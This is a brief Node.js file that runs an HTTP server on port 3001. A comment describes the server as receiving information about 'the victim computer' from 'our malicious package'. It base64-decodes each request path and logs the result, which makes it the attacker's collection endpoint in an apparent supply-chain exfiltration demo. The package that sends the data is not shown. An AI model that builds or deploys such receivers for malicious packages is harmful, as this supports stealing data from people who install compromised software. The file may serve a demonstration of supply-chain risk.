const http = require("http");

/**
 * We create our own server so our malicious package can
 * send us information about the victim computer.
 */
const server = http.createServer((req, res) => {
  try {
    const base64Ip = req.url.slice(1);
    const data = Buffer.from(base64Ip, "base64").toString("utf8");
    console.log(data);
    console.log("--------------------------");
  } catch (e) {}
  res.end();
});

server.listen(3001);
